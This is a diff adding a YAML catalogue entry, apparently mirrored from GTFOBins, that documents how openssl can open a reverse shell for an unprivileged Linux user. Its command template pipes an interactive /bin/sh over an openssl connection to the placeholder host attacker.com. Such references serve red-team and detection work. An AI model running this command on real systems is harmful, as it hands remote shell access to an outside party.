@@ -1,0 +1,27 @@
+id: gtfobins/openssl/reverse-shell/unprivileged
+type: binary
+platform: linux
+name: openssl
+phases:
+- execution
+- command-and-control
+capabilities:
+- reverse-shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'mkfifo /path/to/temp-socket
+
+    /bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket'
+  comment: The shell process is not spawn by `openssl`.
+references:
+- https://gtfobins.github.io/gtfobins/openssl/
+tags:
+- linux
+- unix
+- gtfobins
